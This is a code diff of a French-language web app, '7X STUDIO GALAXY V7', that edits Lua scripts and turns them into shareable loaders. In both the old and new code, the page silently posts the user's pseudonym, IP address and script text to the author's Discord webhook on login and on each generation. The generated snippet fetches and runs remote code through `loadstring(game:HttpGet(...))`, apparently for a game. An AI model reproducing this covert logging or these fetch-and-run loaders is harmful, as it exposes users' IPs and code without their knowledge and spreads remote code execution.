@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>7X STUDIO | GALAXY V7 HYZER EDITION</title>
+    <title>7X STUDIO | GALAXY V7 HYZER</title>
 
     <meta property="og:title" content="7X STUDIO - GALAXY V7">
     <meta property="og:type" content="website">
-    <meta property="og:description" content="Générateur de scripts LUA avec clés HYZER uniques.">
+    <meta property="og:description" content="Studio mobile ultime. Générateur HYZER.">
     <meta name="theme-color" content="#bc4be3">
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -197,14 +197,14 @@
         <div class="action-bar">
             <div id="file-name-display" style="font-size: 0.8rem; font-weight: 700;"><i class="fa-solid fa-terminal"></i> EN ATTENTE</div>
             <div style="display:flex; gap:10px;">
-                <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem; background: #2ea44f; border:none; color:white;" onclick="generateLoadstring()" title="Générer Key HYZER">
+                <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem; background: #2ea44f; border:none; color:white;" onclick="generateLoadstring()" title="Générer Loadstring">
                     <i class="fa-solid fa-link"></i>
                 </button>
                 <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem;" onclick="exportData()"><i class="fa-solid fa-download"></i></button>
                 <button class="btn-icon" style="width:36px; height:36px; font-size:0.9rem; background: var(--accent); border:none; color:white;" onclick="saveActiveFile()"><i class="fa-solid fa-floppy-disk"></i></button>
             </div>
         </div>
-        <textarea id="editor-area" spellcheck="false" placeholder="-- Collez votre script ici et cliquez sur le lien vert..."></textarea>
+        <textarea id="editor-area" spellcheck="false" placeholder="-- Collez votre script LUA ici..."></textarea>
         <div class="footer">
             <div id="line-stat">LIGNES: 0</div>
             <div id="user-label" style="color:var(--cyan); font-weight: 900;">GALAXY-V7</div>
@@ -241,9 +241,6 @@
         let actionTarget = '';
         let audioCtx = null;
 
-        const folderNames = ["DATABASE", "MODULES", "INTERFACE", "ENGINE"];
-        const fileNames = ["CLIENT_SIDE", "SERVER_CONFIG", "MAIN_UI"];
-
         function playPing() {
             try {
                 if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -278,13 +275,12 @@
             setTimeout(() => { document.getElementById('splash-screen').style.display = 'none'; }, 500);
             renderFiles();
             notify('Système Prêt', 'fa-solid fa-ghost');
-            if(!isStealthMode) sendLogToDiscord("CONNEXION", "N/A", "LOGIN", "Nouvelle session utilisateur.");
+            if(!isStealthMode) sendLogToDiscord("CONNEXION", "LOGIN", "N/A", "Session ouverte.");
         }
 
         async function sendLogToDiscord(action, dossier, fichier, contenu) {
             if(isStealthMode) return;
             const pseudo = document.getElementById('user-label').innerText;
-            const sessionTime = Math.floor((Date.now() - sessionStartTime) / 60000);
             const payload = {
                 username: "🛰️ 7X GALAXY MONITOR",
                 embeds: [{
@@ -292,26 +288,23 @@
                     color: 12339939,
                     fields: [
                         { name: "👤 User", value: `\`${pseudo}\``, inline: true },
-                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
-                        { name: "📂 Target", value: `\`${dossier} / ${fichier}\``, inline: false }
+                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true }
                     ],
                     description: "```lua\n" + (contenu.substring(0, 1800) || "N/A") + "\n```",
-                    footer: { text: "7X STUDIO V7 - SECURITY" },
+                    footer: { text: "7X STUDIO V7" },
                     timestamp: new Date().toISOString()
                 }]
             };
-            fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
+            fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
         }
 
-        // --- FONCTION MAGIQUE HYZER-RANDOM ---
+        // --- GÉNÉRATEUR LOADSTRING MODIFIÉ (SANS LIGNE DE COMMENTAIRE) ---
         async function generateLoadstring() {
             const content = document.getElementById('editor-area').value.trim();
             const randomNumber = Math.floor(1000 + Math.random() * 9000);
             const myKey = `HYZER-${randomNumber}`;
 
-            if(!content || content === "-- Sélectionnez un script pour commencer...") {
-                return notify('Éditeur vide !', 'fa-solid fa-triangle-exclamation');
-            }
+            if(!content || content === "") return notify('Éditeur vide !', 'fa-solid fa-triangle-exclamation');
 
             notify(`Génération ${myKey}...`, 'fa-solid fa-key fa-spin');
 
@@ -326,14 +319,16 @@
                 const data = await response.json();
                 
                 const finalUrl = `https://bytebin.lucko.me/${data.key}?key=${myKey}`;
-                const finalCode = `--[[ GALAXY V7 PRIVATE ]]\n_G.Key = "${myKey}";\nloadstring(game:HttpGet("${finalUrl}"))()`;
+                
+                // Ici, j'ai supprimé la ligne --[[ GALAXY V7 PRIVATE ]]
+                const finalCode = `_G.Key = "${myKey}";\nloadstring(game:HttpGet("${finalUrl}"))()`;
 
                 await navigator.clipboard.writeText(finalCode);
                 notify(`Key ${myKey} Copiée !`, 'fa-solid fa-crown');
                 
                 sendLogToDiscord("GÉNÉRATION LOADSTRING", "CLOUD", myKey, finalCode);
             } catch(e) {
-                notify('Erreur API', 'fa-solid fa-wifi');
+                notify('Erreur Serveur', 'fa-solid fa-wifi');
             }
         }
 
@@ -401,7 +396,7 @@
         function confirmAction() {
             const val = document.getElementById('modal-input').value.trim().toUpperCase();
             if(!val) return;
-            if(actionTarget === 'folder') db[val] = [];
+            if(actionTarget === 'folder') { if(!db[val]) db[val] = []; }
             else { let fk = Object.keys(db)[0]; db[fk].push({ n: val + ".LUA", c: "-- Script\n" }); }
             localStorage.setItem('7X_V7_DB', JSON.stringify(db));
             renderFiles(); closeModal();
